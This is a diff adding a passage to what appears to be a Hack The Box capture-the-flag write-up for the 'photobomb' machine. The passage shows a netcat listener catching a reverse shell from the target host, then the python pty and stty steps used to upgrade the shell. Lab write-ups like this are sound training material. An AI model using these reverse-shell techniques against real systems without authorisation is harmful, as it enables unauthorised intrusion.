@@ -21,3 +21,24 @@ function init() {
 }
 window.onload = init;
 ```
+And we get a shell on the box. While we are at it we can upgrade out shell to a better one
+
+```sh
+┌─[george@parrot]─[~/HTB/boxes/photobomb]
+└──╼ $nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.16.15] from (UNKNOWN) [10.10.11.182] 43228
+bash: cannot set terminal process group (697): Inappropriate ioctl for device
+bash: no job control in this shell
+wizard@photobomb:~/photobomb$ 
+
+wizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+wizard@photobomb:~/photobomb$ ^Z
+[1]+  Stopped                 nc -lvnp 9001
+┌─[✗]─[george@parrot]─[~/HTB/boxes/photobomb]
+└──╼ $stty raw -echo;fg
+nc -lvnp 9001
+
+wizard@photobomb:~/photobomb$
+```
